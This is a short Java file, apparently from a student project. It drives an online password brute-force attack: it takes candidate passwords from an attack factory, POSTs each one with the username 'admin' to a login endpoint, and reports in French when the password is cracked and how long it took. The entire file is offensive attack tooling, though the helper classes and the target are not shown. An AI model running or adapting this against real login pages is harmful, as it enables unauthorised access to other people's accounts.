import java.io.IOException;
import java.util.*;
public class TestAttaque{
    public static void main(String args[]) throws IOException{
        if ( args.length < 1){
            System.out.println(" Argument invalid");
            return;
        }
        AttaqueFactory factory = new AttaqueFactory();
        Attaque attaque = factory.getAttaque(args[0]);
        long avantattaque = System.currentTimeMillis();
        ArrayList<String> attaquer = new ArrayList<String>();
        attaquer = attaque.CreerAttaque();
        for(String a : attaquer ){
           String data = "login=admin&password="+a;
            if(Requete.sendPOST(data).equalsIgnoreCase("reussie")){
                System.out.println("LE MOT DE PASSE EST CRACKER AVEC SUCCEE :"+a) ;
                long apresattaque = System.currentTimeMillis();
                long duree = (apresattaque - avantattaque)/1000;
                System.out.println(duree+"secondes");
                return;
           } 
        }
         System.out.println("Malheureusemnt pour vous on peut pas cracker le mot de passe essayez une autre methode !!!");
    }
}